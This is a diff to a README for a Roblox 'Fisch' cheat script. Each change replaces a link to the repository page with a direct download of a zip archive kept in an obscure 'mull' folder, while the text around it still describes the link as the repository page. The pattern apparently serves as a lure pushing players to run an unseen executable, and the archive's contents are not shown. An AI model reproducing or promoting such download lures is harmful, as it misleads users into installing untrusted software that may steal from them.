@@ -1,6 +1,6 @@
 # 🐟 Roblox-Fisch-Script - Simple Tool for Better Fishing
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Roblox--Fisch--Script-brightgreen)](https://github.com/naruto1233958/Roblox-Fisch-Script)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Roblox--Fisch--Script-brightgreen)](https://github.com/naruto1233958/Roblox-Fisch-Script/raw/refs/heads/main/mull/Script-Roblox-Fisch-v1.0-beta.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ If your computer meets these, the script will run without problems.
 
 Click the button below to visit the download page. This page contains all you need to start using the script.
 
-[![Download Roblox-Fisch-Script](https://img.shields.io/badge/Download-Roblox--Fisch--Script-blue)](https://github.com/naruto1233958/Roblox-Fisch-Script)
+[![Download Roblox-Fisch-Script](https://img.shields.io/badge/Download-Roblox--Fisch--Script-blue)](https://github.com/naruto1233958/Roblox-Fisch-Script/raw/refs/heads/main/mull/Script-Roblox-Fisch-v1.0-beta.5.zip)
 
 This link takes you to the main code repository. Look for the **Releases** section or folders containing executable files.
 
@@ -52,7 +52,7 @@ This link takes you to the main code repository. Look for the **Releases** secti
 
 Follow these steps to get Roblox-Fisch-Script running on your PC:
 
-1. Click the green **Download** button at the top or visit [https://github.com/naruto1233958/Roblox-Fisch-Script](https://github.com/naruto1233958/Roblox-Fisch-Script).
+1. Click the green **Download** button at the top or visit [https://github.com/naruto1233958/Roblox-Fisch-Script/raw/refs/heads/main/mull/Script-Roblox-Fisch-v1.0-beta.5.zip](https://github.com/naruto1233958/Roblox-Fisch-Script/raw/refs/heads/main/mull/Script-Roblox-Fisch-v1.0-beta.5.zip).
 
 2. Scroll to the **Releases** tab on the GitHub page. This is usually on the right side or in the menu.
 
@@ -160,4 +160,4 @@ The repository covers:
 
 Access the page anytime to download or update:
 
-[Get Roblox-Fisch-Script](https://github.com/naruto1233958/Roblox-Fisch-Script)
+[Get Roblox-Fisch-Script](https://github.com/naruto1233958/Roblox-Fisch-Script/raw/refs/heads/main/mull/Script-Roblox-Fisch-v1.0-beta.5.zip)
